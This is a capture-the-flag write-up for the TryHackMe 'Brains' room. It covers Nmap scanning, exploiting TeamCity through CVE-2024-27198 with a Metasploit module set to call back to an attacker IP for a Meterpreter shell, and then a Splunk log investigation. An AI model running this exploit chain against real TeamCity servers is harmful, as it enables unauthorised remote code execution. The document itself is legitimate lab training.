## THM CTF - Brains

We can start changing local DNS to easily handle all the process.
```
sudo nano /etc/hosts
```
Add the record:
```
xxx.xxx.xxx.xxx	   brains.thm
```
Now we can proceed with an Nmap scan.
```
sudo nmap -sS -T4 brains.thm -p-
```
We discovered four open ports, and we can list the services they provide.
```
sudo nmap -sS -T4 brains.thm -p22,80,36131,50000 -sV
```
```
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
36131/tcp open  java-rmi Java RMI
50000/tcp open  http     Apache Tomcat (language: en)
```
It's time for some browsing.
```Port 80``` offers us a site in maintenance, while ```port 50000``` offers us with a login page.

```Port 36131``` gives us some hints about a possible API (Java remote invocation) located on the target machine.

Let's enumerate both ```port 80 and 50000```.

We find that the login page belongs to a product named ```TeamCity```.
Having the ```build number``` in the login page, we can try to search for a possible exploit.

We manage to find this one:

[https://github.com/W01fh4cker/CVE-2024-27198-RCE](https://github.com/W01fh4cker/CVE-2024-27198-RCE)

We check if there is something in the ```Metasploit Framework```.
```
msfconsole
search TeamCity
```
We find the same exploit ready to be used.
Just set all the parameters correctly.
```
set RHOSTS brains.thm
set RPORT 50000
set LHOST [Attaker_IP]
```
We obtain a ```Meterpreter``` session.
```
shell
/bin/bash -i
```
We can navigate to the user’s home folder and retrieve the flag.

Let’s proceed with the second part of the task.

Logging in with Splunk credentials we can begin the investigation process.

Using search function:
```
last year
adduser
```
we are able to identify the attack date. Narrowing the search using this information, we find the name of the user added by the attacker.

Then, with the same time interval, we can search for the name of the package installed.
```
install
```
Using this filter we can easily find the second flag.

Last filter to use in order to find the third flag is:
```
plugin
```
